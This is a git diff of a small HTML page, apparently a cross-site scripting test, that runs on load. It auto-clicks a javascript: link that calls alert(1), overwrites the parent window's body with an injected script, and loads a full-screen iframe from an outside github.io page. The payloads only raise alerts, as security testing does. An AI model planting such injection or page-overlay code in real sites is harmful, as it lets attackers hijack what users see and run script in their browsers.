@@ -1,16 +1,35 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Page Replace</title>
-</head>
-     <a id="xssmepls" href="javascript:(()=>{alert(1);})();">test</a>
     <script>
-        <a id="xssmepls" href="javascript:(()=>{alert(1);})();">test</a>
-        document.getElementById("xssmepls").click();
-        window.parent.document.body.innerHTML = '<script>alert("XSS via parent!")</script>';
+        // JavaScript to trigger the alert when the page loads
+        window.onload = () => {
+            // Inject alert in the parent window (if allowed by same-origin policy)
+            window.parent.document.body.innerHTML = '<script>alert("XSS via parent!")</script>';
+            
+            // Execute a click action on the link to trigger alert
+            document.getElementById("xssmepls").click();
+            alert("JavaScript Alert Executed!");
+            
+            // Dynamically create and append the iframe
+            var iframe = document.createElement("iframe");
+            iframe.src = "https://rudraksha-das.github.io/iframe.html";
+            iframe.style.width = "100%";
+            iframe.style.height = "100vh";
+            iframe.style.border = "none";
+            iframe.style.position = "absolute";
+            iframe.style.top = "0";
+            iframe.style.left = "0";
+            document.body.appendChild(iframe);
+        };
     </script>
+</head>
 <body>
+    <!-- Anchor link in the body section to avoid invalid HTML -->
+    <a id="xssmepls" href="javascript:(()=>{alert(1);})();">test</a>
 </body>
 </html>
+
